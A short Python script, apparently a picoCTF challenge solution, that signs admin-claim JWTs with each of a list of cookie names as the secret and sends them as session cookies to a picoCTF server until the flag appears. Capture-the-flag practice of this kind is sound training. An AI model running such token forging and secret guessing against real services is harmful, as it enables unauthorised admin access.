#!/usr/bin/python3

import requests
import base64
import jwt


# JWT crack using specific keywords provided
cookie_names = ["snickerdoodle", "chocolate chip", "oatmeal raisin", "gingersnap", "shortbread", "peanut butter", "whoopie pie", "sugar", "molasses", "kiss", "biscotti", "butter", "spritz", "snowball", "drop", "thumbprint", "pinwheel", "wafer", "macaroon", "fortune", "crinkle", "icebox", "gingerbread", "tassie", "lebkuchen", "macaron", "black and white", "white chocolate macadamia"]

url = "http://mercury.picoctf.net:6259/display"

for i in range (0,len(cookie_names)):
    secret = cookie_names[i]
    encoded_jwt = jwt.encode({"very_auth": "admin"}, secret, algorithm="HS256", headers={"very_auth": "admin"})
    print("Secret: " + secret)
    print(encoded_jwt)

    r=requests.get(url, cookies={"session": encoded_jwt}, allow_redirects=False)
    # print(r.text)
    if "pico" in r.text:
        print(r.text)
        print("session: " + encoded_jwt)
